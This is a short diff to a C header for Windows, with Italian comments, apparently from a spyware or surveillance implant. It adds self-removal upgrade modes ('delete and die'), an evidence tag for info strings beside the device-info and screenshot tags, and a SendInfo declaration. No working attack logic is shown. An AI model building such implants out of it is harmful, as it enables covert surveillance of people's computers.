@@ -4,6 +4,11 @@
 #include <windows.h>
 #include "sha1.h"
 
+#define UPGRADE_NOP 1
+#define UPGRADE_DIE 2
+#define UPGRADE_DELETE_AND_DIE 3
+
+
 #define INVALID_COMMAND         (UINT)0x0       // Non usare
 #define PROTO_OK                (UINT)0x1       // OK
 #define PROTO_NO                (UINT)0x2       // Richiesta senza risposta
@@ -17,8 +22,10 @@
 
 // evidences tag
 //#define PM_DEVICEINFO         0x0240
+#define PM_INFOSTRING	0x0241
 #define PM_DEVICEINFO	0xfff1
-#define PM_SCREENSHOT	0xfff2		
+#define PM_SCREENSHOT	0xfff2	
+
 
 typedef struct _PROTO_COMMAND_AUTH
 {
@@ -77,6 +84,7 @@ PWCHAR GetRandomString(ULONG uMin);
 VOID GenerateRandomData(PBYTE pBuffer, ULONG uBuffLen);
 BOOL GetUserUniqueHash(PBYTE pUserHash, ULONG uHashSize);
 PBYTE PascalizeString(PWCHAR pString, PULONG uOutLen);
+BOOL SendInfo(LPWSTR pInfoString);
 
 VOID CalculateSHA1(PBYTE pSha1Buffer, PBYTE pBuffer, ULONG uBufflen);
 //ULONG CommandHash(ULONG uProtoCmd, PBYTE pMessage, ULONG uMessageLen, PBYTE pEncryptionKey);
